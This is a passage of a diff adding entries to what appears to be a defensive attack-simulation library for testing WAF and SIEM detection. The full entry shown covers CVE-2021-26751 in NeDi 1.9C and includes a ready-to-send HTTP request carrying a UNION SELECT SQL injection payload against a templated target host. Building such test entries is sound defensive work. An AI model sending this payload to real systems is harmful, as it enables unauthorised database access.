+        "title": "poc_advisory for CVE-2021-26754",
+        "link": "https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-i/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-26751 - NeDi SQL Injection",
+    "displayName": "CVE-2021-26751 - NeDi SQL Injection",
+    "description": "NeDi 1.9C allows an authenticated user to perform SQL injection in the Monitoring History function via the det GET parameter of /Monitoring-History.php. The request sends a UNION SELECT payload in det. No vendor WAF rule found; built from the advisory entry point. A dummy session cookie is included because the endpoint is authenticated.\n\nReferences used to recreate this request:\n- https://n4nj0.github.io/advisories/nedi-multiple-vulnerabilities-i/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-26751 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Monitoring-History.php?det=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-26751"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2021-26751",
+        "link": "https://n4nj0.github.io/advisories/nedi-multiple-vulnerabilities-i/"
       }
     ],
     "public": false,
